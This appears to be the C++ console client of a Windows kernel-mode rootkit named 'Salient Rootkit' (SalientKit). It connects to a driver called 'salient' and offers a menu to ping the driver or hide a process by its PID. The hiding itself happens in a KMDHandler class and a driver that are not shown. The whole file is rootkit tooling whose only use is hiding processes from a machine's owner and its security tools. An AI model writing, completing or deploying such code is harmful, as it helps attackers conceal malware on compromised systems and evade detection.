#include <iostream>
#include <wchar.h>
#include "KMDHandler.h"

KMDHandler kmdHandler;

void handleHideProcess()
{
	int pID;
	printf("Enter PID> ");
	scanf_s("%u", &pID);
	kmdHandler.hideProcess(pID);
}

void handleInput()
{
	while (1)
	{
		printf("\nSalient Rootkit Client\n");
		printf("----------------------\n");
		printf("Options:\n");
		printf("0) Ping driver\n");
		printf("1) Hide process\n");
		printf("\nSK> ");

		int input;
		scanf_s("%u", &input);

		switch (input)
		{
		case 0:
			kmdHandler.pingDriver();
			break;
		case 1:
			handleHideProcess();
			break;
		default:
			printf("\n[!] Invalid option selected.\n");
			continue;
		}
	}
}

int main()
{
	bool connected = kmdHandler.connectDriver((wchar_t*) L"salient");
	if (!connected) return -1;

	printf("[*] Connected to SalientKit\n");
	handleInput();
	
	return 0;
}
